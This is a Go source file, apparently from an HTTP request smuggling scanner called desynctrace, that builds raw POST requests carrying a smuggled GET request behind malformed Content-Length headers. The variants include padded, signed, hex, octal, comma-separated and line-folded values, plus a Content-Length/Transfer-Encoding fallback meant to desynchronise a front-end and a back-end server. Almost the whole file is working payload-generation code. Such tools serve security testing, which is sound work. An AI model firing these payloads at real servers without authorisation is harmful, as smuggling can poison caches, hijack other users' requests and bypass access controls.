package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

// CLSpacingVector tests Content-Length header parsing edge cases.
// Different parsers handle spacing, signs, encoding of the CL value differently.
// If frontend and backend parse CL differently, smuggling is possible.
type CLSpacingVector struct{}

func NewCLSpacingVector() *CLSpacingVector {
	return &CLSpacingVector{}
}

func (v *CLSpacingVector) Name() string {
	return "CL.Spacing (Content-Length Parsing Edge Cases)"
}

func (v *CLSpacingVector) Type() VectorType {
	return CLSpacing
}

func (v *CLSpacingVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	return nil // requires raw client
}

func (v *CLSpacingVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	smuggled := fmt.Sprintf("GET /desynctrace-cls HTTP/1.1\r\nHost: %s\r\n\r\n", host)
	bodyLen := len(smuggled)

	// Each variant sends the smuggled request as the body, but uses a
	// weird CL format that one server might accept and another might not.

	clVariants := []struct {
		name  string
		clVal string
		notes string
	}{
		// Spacing variants
		{"space-before-value", fmt.Sprintf(" %d", bodyLen), "Leading space before CL value"},
		{"space-after-value", fmt.Sprintf("%d ", bodyLen), "Trailing space after CL value"},
		{"tab-before-value", fmt.Sprintf("\t%d", bodyLen), "Tab before CL value"},
		{"multiple-spaces", fmt.Sprintf("  %d  ", bodyLen), "Multiple spaces around CL value"},

		// Sign variants
		{"plus-sign", fmt.Sprintf("+%d", bodyLen), "Positive sign prefix: +N"},
		{"minus-zero", "-0", "Negative zero: -0. Some parsers accept, others reject."},
		{"double-zero", "00", "Leading zero: 00. Might be parsed as octal by some."},

		// Numeric format variants
		{"leading-zeros", fmt.Sprintf("%06d", bodyLen), "Leading zeros: 000042"},
		{"hex-prefix", fmt.Sprintf("0x%x", bodyLen), "Hex prefix: 0x2A. C-style — Python's int() might accept it."},
		{"octal-prefix", fmt.Sprintf("0%o", bodyLen), "Octal prefix: 052. Some parsers might interpret leading 0 as octal."},

		// CL header name variants
		{"space-in-header-name", fmt.Sprintf("%d", bodyLen), "Space before colon: 'Content-Length : N'"},
		{"underscore-header", fmt.Sprintf("%d", bodyLen), "Underscore: 'Content_Length: N' — nginx may normalize to hyphen"},

		// Encoding tricks
		{"cl-with-comma", fmt.Sprintf("%d, %d", bodyLen, bodyLen), "CL with comma: 'N, N'. Some parsers accept if both values match."},
		{"cl-with-semicolon", fmt.Sprintf("%d; ignored", bodyLen), "CL with semicolon: 'N; ignored'. Some parsers stop at semicolon."},

		// Newline tricks
		{"cl-line-fold", fmt.Sprintf("\r\n %d", bodyLen), "CL value via obs-fold: continuation line"},
	}

	for _, variant := range clVariants {
		var rawHeaders string

		switch variant.name {
		case "space-in-header-name":
			rawHeaders = fmt.Sprintf("Host: %s\r\n"+
				"Content-Length : %s\r\n"+
				"Connection: keep-alive\r\n",
				host, variant.clVal)
		case "underscore-header":
			rawHeaders = fmt.Sprintf("Host: %s\r\n"+
				"Content_Length: %s\r\n"+
				"Connection: keep-alive\r\n",
				host, variant.clVal)
		default:
			rawHeaders = fmt.Sprintf("Host: %s\r\n"+
				"Content-Length: %s\r\n"+
				"Connection: keep-alive\r\n",
				host, variant.clVal)
		}

		raw := client.BuildRawRequestExact(
			fmt.Sprintf("POST %s HTTP/1.1", path),
			rawHeaders,
			[]byte(smuggled),
		)

		payloads = append(payloads, RawPayload{
			Name:        fmt.Sprintf("cl-spacing-%s", variant.name),
			Data:        raw,
			Description: fmt.Sprintf("CL parsing edge case '%s': %s", variant.name, variant.notes),
			Technique:   "cl-parsing",
		})
	}

	// Special: request with BOTH Content-Length and Transfer-Encoding
	// where CL has weird formatting that might cause one server to reject it
	// and fall back to TE, while the other accepts it
	{
		body := "0\r\n\r\n" + smuggled
		rawHeaders := fmt.Sprintf("Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n",
			host, len(body))

		// Also test with malformed CL that might be rejected → server falls back to TE
		rawHeaders2 := fmt.Sprintf("Host: %s\r\n"+
			"Content-Length: %dX\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n",
			host, len(body))

		raw := client.BuildRawRequestExact(
			fmt.Sprintf("POST %s HTTP/1.1", path),
			rawHeaders2,
			[]byte(body),
		)
		_ = rawHeaders

		payloads = append(payloads, RawPayload{
			Name:        "cl-malformed-with-te-fallback",
			Data:        raw,
			Description: "CL with trailing 'X' char: '42X'. Server A rejects CL and uses TE. Server B parses '42' and uses CL. Causes desync.",
			Technique:   "cl-malformed-fallback",
		})
	}

	return payloads
}

func (v *CLSpacingVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
